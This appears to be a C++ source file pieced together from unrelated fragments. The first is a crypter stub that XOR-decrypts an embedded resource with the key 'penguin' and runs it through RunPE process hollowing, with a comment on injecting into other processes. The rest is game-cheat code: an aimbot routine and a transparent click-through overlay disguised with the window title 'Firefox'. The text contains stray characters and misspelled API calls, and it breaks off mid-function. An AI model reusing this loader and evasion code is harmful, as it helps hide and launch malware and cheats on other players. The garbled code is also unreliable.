#include <iostream>
#include <Windows.h>
#include <fstream>
#include "Runpe.h"
#include <vector>
#include <string>
using namespace std;


int Rsize;
//char* RData;


//void Resource(int id)
//{
//	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
//	HGLOBAL temp = LoadResource(NULL, hResource);
//	Rsize = SizeofResource(NULL, hResource);
//	RData = (char*)LockResource(temp);
//}
s

//void enc()
//{
//	switch (RData[strlen(RData) - 1])
//	{
//	case '1':
//		{
//			}
//		break;
//	case '2':
//		{
//			string cipher = "penguin";
//			for (unsigned x = 0; x < Rsize; x++)           // Steps through the characters of the string.
//				RData[x] ^= cipher[x % cipher.size()];
//			//for (int i = 0; i < Rsize; i++)       
//			//	{
//			//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
//			//	}
//
//			//	char cipher[] = "penguin";
//			//ofstream out("Stub Output.txt");
//			//	for (int i = 0; i < Rsize; i++)       
//			//	{
//			//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
//			//	}
//			}												// Simple Xor chiper
//		break;
//	case '3':
//		{	std::ofstream out("3.txt");
//		out << strlen(RData) - 1;
//		char cipher[] = "test";
//		unsigned short pl = strlen(cipher);
//		char passTable[1024];
//		for (int i = 0; i != 1024; ++i)
//			passTable[i] = cipher[i%pl];
//
//		for (unsigned long long i = 0; i != Rsize; i += 2)
//		{
//			out << RData[i];
//			RData[i] ^= passTable[i % 1024];
//		}
//
//			}
//		break;
//	}
//	return;
//}


std::vector<char> RData;

void Resource(int id)
{
	size_t Rsize;

	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData.resize(Rsize);
	memcpy((void*)RData.data(), temp, Rsize);  // replace &RData[0] with RData.data() if C++11
}

void xor_crypt(const std::string &key, std::vector<char> &data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];
}



void enc()
{
	switch (RData.back())
	{
	case '1':
		{
			std::ofstream out("1.txt");
		}
		break;
	case '2':
		{
			xor_crypt("penguin", RData);
		}
		break;
	}
	return;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	Resource(10);
	enc();

	LPVOID pFile;
	TCHAR szFilePath[1024];

	pFile = RData.data();
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
		//or you may write the file path you want to inject in.
		ExecFile(LPSTR(szFilePath), pFile);
	}
	return 0;
};

using namespace std;

int Width = GetSystemMetrics(SM_CXSCREEN);
int Height = GetSystemMetrics(SM_CYSCREEN);
const MARGINS Margin = { -1 };
DWORD ScreenCenterX;
DWORD ScreenCenterY;

RECT GameRect = { NULL };
HWND GameWnd = NULL;
void create_console();

HRESULT DirectXInit(HWND hWnd);
LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
void SetupWindow();
WPARAM MainLoop();
void CleanuoD3D();

int isTopwin();
void SetWindowToTarget();

#define TopWindowGame 11
#define TopWindowMvoe 22

IDirect3D9Ex* p_Object = NULL;
IDirect3DDevice9Ex* p_Device = NULL;
D3DPRESENT_PARAMETERS p_Params = { NULL };

#define M_Name xorstr_(L" ")
HWND MyWnd = NULL;
MSG Message = { NULL };

extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

#define M_PI	3.1415926535
D3DXMATRIX ToMatrix(Vector3 Rotation, Vector3 origin = Vector3(0, 0, 0));
D3DXMATRIX ToMatrix(Vector3 Rotation, Vector3 origin)
{
	float Pitch = (Rotation.x * float(M_PI) / 180.f);
	float Yaw = (Rotation.y * float(M_PI) / 180.f);
	float Roll = (Rotation.z * float(M_PI) / 180.f);

	float SP = sinf(Pitch);
	float CP = cosf(Pitch);
	float SY = sinf(Yaw);
	float CY = cosf(Yaw);
	float SR = sinf(Roll);
	float CR = cosf(Roll);

	D3DXMATRIX Matrix;
	Matrix._11 = CP * CY;
	Matrix._12 = CP * SY;
	Matrix._13 = SP;
	Matrix._14 = 0.f;

	Matrix._21 = SR * SP * CY - CR * SY;
	Matrix._22 = SR * SP * SY + CR * CY;
	Matrix._23 = -SR * CP;
	Matrix._24 = 0.f;

	Matrix._31 = -(CR * SP * CY + SR * SY);
	Matrix._32 = CY * SR - CR * SP * SY;
	Matrix._33 = CR * CP;
	Matrix._34 = 0.f;

	Matrix._41 = origin.x;
	Matrix._42 = origin.y;
	Matrix._43 = origin.z;
	Matrix._44 = 1.f;

	return Matrix;
}

bool Features::DoAimbot()
{
	C_BaseEntity* pEntity = NULL;
	if (g_Settings::iBone == 0)
		pEntity = FindTargetFOV(BONE_HEAD);
	else if (g_Settings::iBone == 1)
		pEntity = FindTargetFOV(BONE_CHEST);
	else
		pEntity = NULL;

	if (!pEntity)
		return false;

	Vector vecEnemyAngles = g_pEngine->CalcAngle(pEntity->GetBonePostionByID(g_iBoneID), g_pCamera->GetViewTranslation());
	vecEnemyAngles.Clamp();
	g_pLocalEntity->SetViewAngle(vecEnemyAngles);
}


static void glfwErrorCallback(int error, const chat* description)
{
}

void ssetupWindows() {
	glfwSetErrorCallback(glfwErrorCallback);
	if (!glfwinit()) {
		
		return;
	}
	
	GLFWmonitor* monitor = glwfGetPrimaryMonitor();
	if (!monitor) {
		fprintf(stderr, E("Error 7! Contact To Support\n"));
		return;
	}
	
	g_width = glfwGetVideoMode(monitor) ->width +1;
	e_height = glfwGetVideoMode(monitor) ->height +1;
	
	glfwWindowHint(GLFW_FLOATING, true);
	glfwWindowHint(GLFW_RESIZABLE, false);
	glfwWindowHint(GLFW_MAXIMIZED, true);
	glfwWindowHint(GLFW_TRANSPARENT_FRAMEBUFFER, true);

	g_window = glfwCreateWindow(g_width, g_height, E("Firefox"), NULL, NULL);
	if (g_window == NULL) {
		std::cout << E("Error 6! Contact To Support\n");
		return;
	}

	glfwSetWindowAttrib(g_window, GLFW_DECORATED, false);
	glfwSetWindowAttrib(g_window, GLFW_MOUSE_PASSTHROUGH, true);
	glfwSetWindowMonitor(g_window, NULL, 0, 0, g_width, g_height, 0);

	glfwMakeContextCurrent(g_window);
	glfwSwapInterval(1); // Enable vsync

	if (glewInit() != GLEW_OK)
	{
		fprintf(stderr, E("Error 5! Contacnt To Support\n"));
		return;
	}
